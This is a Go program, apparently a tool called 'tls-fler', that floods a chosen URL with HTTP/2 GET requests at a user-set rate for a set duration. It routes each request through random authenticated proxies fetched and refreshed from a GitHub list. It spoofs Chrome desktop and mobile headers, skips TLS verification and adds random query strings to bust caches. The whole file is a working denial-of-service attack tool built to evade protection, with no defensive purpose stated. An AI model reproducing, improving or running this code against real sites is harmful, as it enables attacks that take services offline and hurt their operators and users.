package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

const (
	proxyURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"

	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
	platformDesktop = `"Windows"`
	platformMobile  = `"Android"`
	uaDesktop       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
	uaMobile        = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
)

const mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"

var mejiSuffixes = []string{
	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
}

type stats struct {
	total   int64
	success int64
	failed  int64
}

var st stats

// ── proxy helpers ────────────────────────────────────────────────────────────

type proxy struct {
	host, port, user, pass string
}

// fetchProxies mengambil daftar proxy dari GitHub
func fetchProxies() ([]proxy, error) {
	resp, err := http.Get(proxyURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return parseProxies(resp.Body)
}

// loadProxiesLocal membaca proxy dari file lokal
func loadProxiesLocal(path string) ([]proxy, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	return parseProxies(f)
}

func parseProxies(r io.Reader) ([]proxy, error) {
	var list []proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		parts := strings.Split(line, ":")
		if len(parts) != 4 {
			continue
		}
		list = append(list, proxy{
			host: parts[0],
			port: parts[1],
			user: parts[2],
			pass: parts[3],
		})
	}
	return list, sc.Err()
}

// proxyPool mengelola daftar proxy dengan rotasi & auto-update dari GitHub
type proxyPool struct {
	mu      sync.RWMutex
	list    []proxy
	localMD5 string // hash sederhana: join semua entry
}

func newProxyPool(localPath string) (*proxyPool, error) {
	pp := &proxyPool{}

	// Coba fetch dari GitHub dulu
	remote, err := fetchProxies()
	if err == nil && len(remote) > 0 {
		fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(remote))
		pp.list = remote
		// Tulis cache ke file lokal
		pp.saveLocal(localPath)
	} else {
		// Fallback ke file lokal
		local, err2 := loadProxiesLocal(localPath)
		if err2 != nil || len(local) == 0 {
			return nil, fmt.Errorf("no proxies available (github: %v, local: %v)", err, err2)
		}
		fmt.Printf("[proxy] loaded %d proxies from local file\n", len(local))
		pp.list = local
	}
	pp.localMD5 = pp.fingerprint()
	return pp, nil
}

func (pp *proxyPool) fingerprint() string {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	parts := make([]string, len(pp.list))
	for i, p := range pp.list {
		parts[i] = p.host + ":" + p.port
	}
	return strings.Join(parts, "|")
}

func (pp *proxyPool) saveLocal(path string) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()
	for _, p := range pp.list {
		fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
	}
}

// autoUpdate polling GitHub setiap interval, update jika ada perubahan
func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for range ticker.C {
		remote, err := fetchProxies()
		if err != nil || len(remote) == 0 {
			continue
		}
		// Bandingkan fingerprint
		newFP := func() string {
			parts := make([]string, len(remote))
			for i, p := range remote {
				parts[i] = p.host + ":" + p.port
			}
			return strings.Join(parts, "|")
		}()
		if newFP == pp.localMD5 {
			continue
		}
		pp.mu.Lock()
		pp.list = remote
		pp.localMD5 = newFP
		pp.mu.Unlock()
		pp.saveLocal(localPath)
		fmt.Printf("[proxy] updated: %d proxies from GitHub\n", len(remote))
	}
}

func (pp *proxyPool) random() proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

// ── HTTP/2 client builder ─────────────────────────────────────────────────────

func buildH2Client(p proxy) *http.Client {
	proxyAddr := fmt.Sprintf("http://%s:%s@%s:%s", p.user, p.pass, p.host, p.port)
	proxyURL, _ := url.Parse(proxyAddr)

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		},
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          1000,
		MaxIdleConnsPerHost:   1000,
		IdleConnTimeout:       30 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}

	// Upgrade transport ke HTTP/2
	_ = http2.ConfigureTransport(transport)

	return &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}
}

// ── request helpers ───────────────────────────────────────────────────────────

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = mejiChars[rand.Intn(len(mejiChars))]
	}
	return string(b)
}

func randomMejiQuery() string {
	nParams := rand.Intn(3) + 1
	pairs := make([]string, 0, nParams)
	used := make(map[string]bool)
	for i := 0; i < nParams; i++ {
		var key string
		for {
			suffix := mejiSuffixes[rand.Intn(len(mejiSuffixes))]
			key = "meji" + suffix
			if !used[key] {
				used[key] = true
				break
			}
		}
		val := randStr(rand.Intn(8) + 4)
		pairs = append(pairs, key+"="+val)
	}
	return strings.Join(pairs, "&")
}

func appendMejiQuery(rawURL string) string {
	q := randomMejiQuery()
	if strings.Contains(rawURL, "?") {
		return rawURL + "&" + q
	}
	schemeEnd := strings.Index(rawURL, "://")
	if schemeEnd >= 0 {
		afterScheme := rawURL[schemeEnd+3:]
		if !strings.Contains(afterScheme, "/") {
			return rawURL + "/?" + q
		}
	}
	return rawURL + "?" + q
}

func setHeaders(req *http.Request, isMobile bool) {
	var ua, platform, mobile string
	if isMobile {
		ua = uaMobile
		platform = platformMobile
		mobile = "?1"
	} else {
		ua = uaDesktop
		platform = platformDesktop
		mobile = "?0"
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Ch-Ua", secChUaVal)
	req.Header.Set("Sec-Ch-Ua-Mobile", mobile)
	req.Header.Set("Sec-Ch-Ua-Platform", platform)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Dnt", "1")
}

func makeRequest(pool *proxyPool, target string, isMobile bool) bool {
	p := pool.random()
	client := buildH2Client(p)

	req, err := http.NewRequest("GET", appendMejiQuery(target), nil)
	if err != nil {
		return false
	}
	setHeaders(req, isMobile)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

// ── main ──────────────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second>")
		fmt.Println("Example: ./tls-fler https://example.com 60 50000")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Println("Error: duration must be a positive integer (seconds)")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Println("Error: rate must be a positive integer (req/s)")
		os.Exit(1)
	}

	localProxyPath := "proxy/global.txt"

	// Init proxy pool
	pool, err := newProxyPool(localProxyPath)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	// Auto-update proxy dari GitHub setiap 30 detik
	go pool.autoUpdate(localProxyPath, 30*time.Second)

	interval := time.Second / time.Duration(rate)
	ticker := time.NewTicker(interval)
	deadline := time.After(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup

	fmt.Printf("Starting HTTP/2 requests to %s\n", target)
	fmt.Printf("Duration: %ds | Rate: %d req/s | Proxies: %d\n\n", duration, rate, len(pool.list))

	start := time.Now()

loop:
	for {
		select {
		case <-deadline:
			break loop
		case <-ticker.C:
			wg.Add(1)
			atomic.AddInt64(&st.total, 1)
			go func() {
				defer wg.Done()
				isMobile := rand.Intn(100) < 40
				if makeRequest(pool, target, isMobile) {
					atomic.AddInt64(&st.success, 1)
				} else {
					atomic.AddInt64(&st.failed, 1)
				}
			}()
		}
	}

	ticker.Stop()
	wg.Wait()
	elapsed := time.Since(start).Seconds()

	fmt.Println("========== SUMMARY ==========")
	fmt.Printf("Target      : %s\n", target)
	fmt.Printf("Duration    : %.2fs\n", elapsed)
	fmt.Printf("Total Req   : %d\n", st.total)
	fmt.Printf("Success     : %d\n", st.success)
	fmt.Printf("Failed      : %d\n", st.failed)
	fmt.Printf("Avg Rate    : %.2f req/s\n", float64(st.total)/elapsed)
	fmt.Println("=============================")
}
